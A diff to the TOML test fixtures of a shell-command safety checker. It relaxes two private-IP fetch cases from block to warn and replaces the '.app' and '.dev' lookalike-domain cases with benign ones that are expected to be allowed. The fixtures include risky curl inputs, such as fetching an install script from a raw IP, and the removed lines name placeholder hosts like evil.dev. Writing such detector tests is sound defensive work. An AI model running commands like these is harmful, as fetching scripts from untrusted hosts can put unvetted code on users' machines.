@@ -45,7 +45,7 @@ name = "raw_ip_v4"
 min_milestone = 1
 input = "curl https://192.168.1.1/install.sh"
 context = "exec"
-expected_action = "block"
+expected_action = "warn"
 expected_rules = ["raw_ip_url", "private_network_access"]
 
 [[fixture]]
@@ -128,21 +128,22 @@ context = "exec"
 expected_action = "warn"
 expected_rules = ["lookalike_tld"]
 
+# `.app` and `.dev` are ordinary developer TLDs, not file-name lookalikes.
 [[fixture]]
-name = "lookalike_tld_app"
+name = "lookalike_tld_app_is_not_flagged"
 min_milestone = 1
-input = "curl https://malware.app"
+input = "curl https://myapp.app/health"
 context = "exec"
-expected_action = "warn"
-expected_rules = ["lookalike_tld"]
+expected_action = "allow"
+expected_rules = []
 
 [[fixture]]
-name = "lookalike_tld_dev"
+name = "lookalike_tld_dev_is_not_flagged"
 min_milestone = 1
-input = "curl https://evil.dev/install"
+input = "curl -sI https://web.dev"
 context = "exec"
-expected_action = "warn"
-expected_rules = ["lookalike_tld"]
+expected_action = "allow"
+expected_rules = []
 
 [[fixture]]
 name = "lookalike_tld_run"
@@ -213,7 +214,7 @@ name = "raw_ip_private_range"
 min_milestone = 1
 input = "curl https://10.0.0.1/api/v1"
 context = "exec"
-expected_action = "block"
+expected_action = "warn"
 expected_rules = ["raw_ip_url", "private_network_access"]
 
 [[fixture]]
